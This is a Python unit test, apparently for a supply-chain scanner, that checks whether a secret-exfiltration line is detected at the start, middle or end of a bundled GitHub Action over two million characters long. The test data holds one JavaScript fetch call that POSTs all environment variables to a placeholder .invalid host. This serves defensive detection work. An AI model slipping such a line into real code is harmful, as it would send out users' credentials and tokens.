"""BIG-BUNDLE-TAIL (0.1.9): a big text's tail is read. A GitHub Action's bundle (ncc's dist/index.js) is often past
2,000,000 characters, the most the supply-chain tree read; past it the text follower read it, and the follower read a
text's first 5,000 assignments, 100 returns, 200 calls, functions and matches of each kind (D-8: an action's own code is
at the bundle's end). The tree now reads a text up to 16,000,000 characters (the largest source file the scans read),
on its own budget: an exfiltration anywhere in a bundle is found, at its start, its middle and its end (split, and
through the action scan: test_big_bundle_tail_split.py).

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from lazaret.scanner import core
from tests.registry import _bundle_support as bb

SEND = 'fetch("https://c.invalid/x", { method: "POST", body: JSON.stringify(process.env) });\n'


def risk(text):
    reasons, line = core.import_time_risk(text, "js")
    return reasons, (text.split("\n")[line - 1] if line else None)


class PlacesTests(unittest.TestCase):
    def test_at_its_start_middle_and_end(self):
        for what, text in (("start", bb.bundle(code=SEND, at=0.0)), ("middle", bb.bundle(code=SEND, at=0.5)),
                           ("end", bb.bundle(main="  " + SEND))):
            with self.subTest(what):
                self.assertGreater(len(text), 2_000_000)
                reasons, line = risk(text)
                self.assertEqual(reasons, [bb.HARVEST])
                self.assertIn("c.invalid", line)


if __name__ == "__main__":
    unittest.main()
